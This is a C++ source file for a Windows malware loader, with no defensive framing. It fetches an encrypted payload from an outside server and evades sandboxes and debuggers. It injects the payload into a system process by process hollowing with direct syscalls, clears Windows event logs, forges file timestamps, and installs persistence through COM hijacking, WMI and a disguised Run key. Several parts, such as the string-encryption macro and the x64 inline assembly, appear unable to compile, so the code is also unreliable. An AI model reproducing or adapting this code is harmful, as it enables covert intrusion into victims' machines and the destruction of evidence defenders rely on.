#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <random>
#include <TlHelp32.h>
#include <wincrypt.h>
#include <timeapi.h>
#include <VersionHelpers.h>
#include <Evntprov.h>
#include <Shlwapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <winhttp.h>
 
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "winhttp.lib")
 
// Encrypted string macro
#define ENC_STR(str) []() { \
    static char enc[] = { str ^ 0xAA }; \
    return enc; \
}()
 
// Payload variables
size_t payloadSize = 0;
unsigned char* encryptedPayload = nullptr;
 
// Random delay with jitter
void RandomDelay(int baseMs, int jitterMs) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(-jitterMs, jitterMs);
    Sleep(baseMs + dis(gen));
}
 
// Fetch encrypted payload from server
bool FetchPayloadFromServer() {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, L"game-cheat-server.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/game-cheat.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
 
    // Add headers to appear legitimate
    WinHttpAddRequestHeaders(hRequest, L"Accept-Encoding: gzip, deflate\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Cache-Control: no-cache\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);
 
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
 
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
 
    // First, get the Content-Length header to determine payload size
    DWORD dwContentLength = 0;
    DWORD dwSize = sizeof(dwContentLength);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwContentLength, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
        payloadSize = static_cast<size_t>(dwContentLength);
    } else {
        // If Content-Length header is not available, we'll determine size by reading data
        payloadSize = 0;
    }
 
    // Allocate initial buffer (or use Content-Length if available)
    const size_t initialBufferSize = (payloadSize > 0) ? payloadSize : 4096;
    encryptedPayload = new unsigned char[initialBufferSize];
    size_t currentBufferSize = initialBufferSize;
    size_t totalBytesRead = 0;
 
    // Read data in chunks
    DWORD dwDownloaded = 0;
    do {
        // Check available data
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            delete[] encryptedPayload;
            encryptedPayload = nullptr;
            payloadSize = 0;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
 
        if (dwSize == 0) break;
 
        // Resize buffer if needed (when Content-Length not available)
        if (totalBytesRead + dwSize > currentBufferSize) {
            size_t newBufferSize = currentBufferSize * 2;
            unsigned char* newBuffer = new unsigned char[newBufferSize];
            memcpy(newBuffer, encryptedPayload, totalBytesRead);
            delete[] encryptedPayload;
            encryptedPayload = newBuffer;
            currentBufferSize = newBufferSize;
        }
 
        // Read data
        if (!WinHttpReadData(hRequest, encryptedPayload + totalBytesRead, dwSize, &dwDownloaded)) {
            delete[] encryptedPayload;
            encryptedPayload = nullptr;
            payloadSize = 0;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
 
        totalBytesRead += dwDownloaded;
        RandomDelay(100, 50); // Add delay between chunks
    } while (dwSize > 0);
 
    // If we didn't get Content-Length header, set the actual payload size
    if (payloadSize == 0) {
        payloadSize = totalBytesRead;
    }
    else if (totalBytesRead != payloadSize) {
        // Handle mismatch between Content-Length and actual bytes read
        delete[] encryptedPayload;
        encryptedPayload = nullptr;
        payloadSize = 0;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
 
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
 
    return true;
}
 
// Environment validation with multiple checks
bool IsSafeEnvironment() {
    // Sandbox detection
    if (GetModuleHandleA(ENC_STR("sbiedll.dll"))) return false;  // Sandboxie
    if (GetModuleHandleA(ENC_STR("dbghelp.dll"))) return false; // Debugger
    if (GetModuleHandleA(ENC_STR("api_log.dll"))) return false; // API logger
    
    // Debug window detection
    const char* debugWindows[] = {
        ENC_STR("OLLYDBG"), ENC_STR("WinDbg"), 
        ENC_STR("IDA"), ENC_STR("x64dbg")
    };
    for (const char* wnd : debugWindows) {
        if (FindWindowA(wnd, NULL)) return false;
    }
    
    // Hardware checks
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return false;
    
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    GlobalMemoryStatusEx(&memStat);
    if (memStat.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) return false;
    
    // Disk space check
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA(ENC_STR("C:\\"), NULL, NULL, &freeBytes);
    if (freeBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)) return false;
    
    // Mouse movement check
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    RandomDelay(200, 50);
    GetCursorPos(&pt2);
    if (pt1.x == pt2.x && pt1.y == pt2.y) return false;
    
    return true;
}
 
// Multi-stage payload decryption
void DecryptPayload(unsigned char* payload, size_t size) {
    // Process ID XOR
    DWORD pid = GetCurrentProcessId();
    for (size_t i = 0; i < size; i++) {
        payload[i] ^= (pid >> (i % 32)) & 0xFF;
    }
    
    // Tick count addition
    DWORD ticks = GetTickCount();
    for (size_t i = 0; i < size; i++) {
        payload[i] += (ticks >> (i % 16)) & 0xFF;
    }
    
    // Bit rotation
    for (size_t i = 0; i < size; i++) {
        payload[i] = _rotr8(payload[i], (i % 7) + 1);
    }
}
 
// Enhanced syscall resolver
DWORD GetSyscallId(const char* functionName) {
    HMODULE ntdll = GetModuleHandleA(ENC_STR("ntdll.dll"));
    if (!ntdll) return 0;
 
    FARPROC func = GetProcAddress(ntdll, functionName);
    if (!func) return 0;
 
    BYTE* pFunc = (BYTE*)func;
    
    // Search for syscall instruction (0F 05)
    for (int i = 0; i < 32; i++) {
        if (pFunc[i] == 0x0F && pFunc[i+1] == 0x05) {
            // Check for mov eax, imm32 (B8) before syscall
            if (i >= 3 && pFunc[i-3] == 0xB8) {
                return *(DWORD*)(pFunc + i - 2);
            }
        }
    }
    return 0;
}
 
// Secure memory zeroing
void SecureZeroMemoryEx(PVOID ptr, SIZE_T cnt) {
    volatile char *vptr = (volatile char *)ptr;
    while (cnt) {
        *vptr = 0;
        vptr++;
        cnt--;
    }
}
 
// Event log cleaner
void CleanEventLogs() {
    const wchar_t* logs[] = {
        L"System", L"Application", L"Security", 
        L"Setup", L"ForwardedEvents"
    };
 
    for (int i = 0; i < 5; i++) {
        HANDLE hEventLog = OpenEventLogW(NULL, logs[i]);
        if (hEventLog) {
            ClearEventLogW(hEventLog, NULL);
            CloseEventLog(hEventLog);
        }
    }
}
 
// Timestamp manipulation
void ManipulateTimestamps(const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        FILETIME ft;
        SYSTEMTIME st;
        GetSystemTime(&st);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> yearDis(0, 365);
        std::uniform_int_distribution<> hourDis(0, 23);
        st.wYear -= 1;
        st.wDay = yearDis(gen) % 28 + 1;
        st.wMonth = yearDis(gen) % 12 + 1;
        st.wHour = hourDis(gen);
        st.wMinute = hourDis(gen);
        st.wSecond = hourDis(gen);
        SystemTimeToFileTime(&st, &ft);
        SetFileTime(hFile, &ft, &ft, &ft);
        CloseHandle(hFile);
    }
}
 
// COM hijacking
bool InstallCOMPersistence() {
    HKEY hKey;
    // Using CLSID for Windows Media Player Network Sharing Service
    const char* clsid = "{F3F09B05-4E6D-4B49-9F0F-E695B6E6FE29}";
    char keyPath[256];
    
    sprintf_s(keyPath, "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        char modulePath[MAX_PATH];
        GetModuleFileNameA(NULL, modulePath, MAX_PATH);
        
        // Set the DLL path
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, strlen(modulePath)+1);
        
        // ThreadingModel
        const char* threadingModel = "Both";
        RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)threadingModel, strlen(threadingModel)+1);
        RegCloseKey(hKey);
        
        // Also register under AppID for better persistence
        HKEY hAppIdKey;
        sprintf_s(keyPath, "Software\\Classes\\AppID\\%s", clsid);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppIdKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hAppIdKey, "DllSurrogate", 0, REG_SZ, (BYTE*)"", 1);
            RegCloseKey(hAppIdKey);
        }
        return true;
    }
    return false;
}
 
// WMI
bool InstallWMIPersistence() {
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }
    IWbemLocator* pLoc = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }
    IWbemServices* pSvc = NULL;
    hr = pLoc->ConnectServer(_bstr_t(L"root\\subscription"), NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        CoUninitialize();
        return false;
    }
 
    // Create event filter
    IWbemClassObject* pFilter = NULL;
    hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilter, NULL);
    if (SUCCEEDED(hr)) {
        IWbemClassObject* pNewFilter = NULL;
        hr = pFilter->SpawnInstance(0, &pNewFilter);
        if (SUCCEEDED(hr)) {
            VARIANT v;
            V_VT(&v) = VT_BSTR;
            V_BSTR(&v) = SysAllocString(L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 0");
            hr = pNewFilter->Put(L"Query", 0, &v, 0);
            VariantClear(&v);
            V_VT(&v) = VT_BSTR;
            V_BSTR(&v) = SysAllocString(L"MyEventFilter");
            hr = pNewFilter->Put(L"Name", 0, &v, 0);
            VariantClear(&v);
            V_VT(&v) = VT_BSTR;
            V_BSTR(&v) = SysAllocString(L"root\\subscription");
            hr = pNewFilter->Put(L"EventNamespace", 0, &v, 0);
            VariantClear(&v);
            IWbemCallResult* pResult = NULL;
            hr = pSvc->PutInstance(pNewFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pResult);
            if (pResult) pResult->Release();
            pNewFilter->Release();
        }
        pFilter->Release();
    }
    
    // Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}
 
// Registry
bool InstallRegistryPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char modulePath[MAX_PATH];
        GetModuleFileNameA(NULL, modulePath, MAX_PATH);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1000, 9999);
        char valueName[32];
        sprintf_s(valueName, "svchost_%d", dis(gen));
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)modulePath, strlen(modulePath)+1);
        RegCloseKey(hKey);
        return true;
    }
    return false;
}
 
// Install varied persistence mechanisms
void InstallPersistence() {
    // Try different methods until one succeeds
    if (InstallCOMPersistence()) return;
    if (InstallWMIPersistence()) return;
    InstallRegistryPersistence();
}
 
// Process hollowing with all evasion techniques
bool LaunchExec() {
    if (!IsSafeEnvironment()) {
        return false;
    }
 
    // Decrypt payload
    unsigned char* payload = new unsigned char[payloadSize];
    memcpy(payload, encryptedPayload, payloadSize);
    DecryptPayload(payload, payloadSize);
    RandomDelay(500, 200);
 
    // Target process selection
    const char* candidates[] = {
        ENC_STR("notepad.exe"),
        ENC_STR("explorer.exe"),
        ENC_STR("dllhost.exe"),
        ENC_STR("svchost.exe")
    };
 
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 3);
    const char* targetProcess = candidates[dis(gen)];
 
    // Process creation
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
    RandomDelay(300, 100);
 
    // PE header validation
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)payload;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
 
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
 
    // Memory manipulation
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
 
    LPVOID base = (LPVOID)nt->OptionalHeader.ImageBase;
    DWORD syscallId = GetSyscallId(ENC_STR("NtUnmapViewOfSection"));
    if (syscallId) {
        __asm {
            mov r10, rcx
            mov eax, syscallId
            mov rcx, pi.hProcess
            mov rdx, base
            syscall
        }
    }
 
    // Allocate memory in target process
    DWORD protectFlags[] = {PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE};
    std::uniform_int_distribution<> protDis(0, 2);
    DWORD initialProtect = protectFlags[protDis(gen)];
 
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, base, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, initialProtect);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
    RandomDelay(200, 50);
 
    // Write headers in chunks
    size_t headerChunkSize = nt->OptionalHeader.SizeOfHeaders / 4;
    for (size_t offset = 0; offset < nt->OptionalHeader.SizeOfHeaders; offset += headerChunkSize) {
        size_t remaining = nt->OptionalHeader.SizeOfHeaders - offset;
        size_t writeSize = min(headerChunkSize, remaining);
        
        if (!WriteProcessMemory(pi.hProcess, (LPVOID)((BYTE*)remoteBase + offset), payload + offset, writeSize, NULL)) {
            TerminateProcess(pi.hProcess, 0);
            SecureZeroMemoryEx(payload, payloadSize);
            delete[] payload;
            return false;
        }
        RandomDelay(50, 20);
    }
 
    // Write sections with proper protections
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_EXECUTE_READWRITE;
        if (!(sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
            protect = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READ : PAGE_READONLY;
        }
 
        LPVOID sectionAddr = (LPVOID)((BYTE*)remoteBase + sections[i].VirtualAddress);
        
        // Write section data in random order
        std::vector<size_t> offsets;
        for (size_t off = 0; off < sections[i].SizeOfRawData; off += 4096) {
            offsets.push_back(off);
        }
        std::shuffle(offsets.begin(), offsets.end(), gen);
 
        for (size_t off : offsets) {
            size_t remaining = sections[i].SizeOfRawData - off;
            size_t writeSize = min((size_t)4096, remaining);
            
            if (!WriteProcessMemory(pi.hProcess, (LPVOID)((BYTE*)sectionAddr + off), payload + sections[i].PointerToRawData + off, writeSize, NULL)) {
                TerminateProcess(pi.hProcess, 0);
                SecureZeroMemoryEx(payload, payloadSize);
                delete[] payload;
                return false;
            }
            RandomDelay(30, 15);
        }
 
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, sectionAddr, sections[i].Misc.VirtualSize, protect, &oldProtect);
    }
 
    // Update context
    ULONG_PTR imageBase = (ULONG_PTR)remoteBase;
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(imageBase), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
 
    // Randomize stack pointer
    std::uniform_int_distribution<> stackDis(0x1000, 0x10000);
    ctx.Rsp -= stackDis(gen);
    ctx.Rcx = (uintptr_t)remoteBase + nt->OptionalHeader.AddressOfEntryPoint;
 
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
    RandomDelay(400, 100);
 
    // Resume thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        TerminateProcess(pi.hProcess, 0);
        SecureZeroMemoryEx(payload, payloadSize);
        delete[] payload;
        return false;
    }
 
    // Cleanup and evasion
    SecureZeroMemoryEx(payload, payloadSize);
    delete[] payload;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
 
    // Trigger garbage collection
    for (int i = 0; i < 5; i++) {
        void* p = malloc(1000000);
        SecureZeroMemoryEx(p, 1000000);
        free(p);
        RandomDelay(100, 50);
    }
 
    // Clean event logs
    CleanEventLogs();
 
    // Manipulate timestamps
    char processPath[MAX_PATH];
    if (GetModuleFileNameExA(pi.hProcess, NULL, processPath, MAX_PATH)) {
        ManipulateTimestamps(processPath);
    }
 
    // Install persistence
    InstallPersistence();
 
    return true;
}
 
int main() {
    // Initial random delay
    RandomDelay(5000, 2000);
 
    // Environment check
    if (!IsSafeEnvironment()) {
        return 0;
    }
 
    // Fetch payload from server
    if (!FetchPayloadFromServer()) {
        return 0;
    }
 
    // Execute
    if (LaunchExec()) {
        const char* msgs[] = {
            ENC_STR("Operation completed successfully"),
            ENC_STR("Process initialized"),
            ENC_STR("System check complete"),
            ENC_STR("Background service started")
        };
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 3);
        
        // Print success message
        const char* msg = msgs[dis(gen)];
        char buffer[256];
        for (int i = 0; msg[i]; i++) {
            buffer[i] = msg[i] ^ 0xAA;
        }
        buffer[strlen(msg)] = '\0';
        std::cout << buffer << std::endl;
    }
 
    // Cleanup
    if (encryptedPayload) {
        SecureZeroMemoryEx(encryptedPayload, payloadSize);
        delete[] encryptedPayload;
    }
 
    // Manipulate our timestamp
    char modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    ManipulateTimestamps(modulePath);
    return 0;
}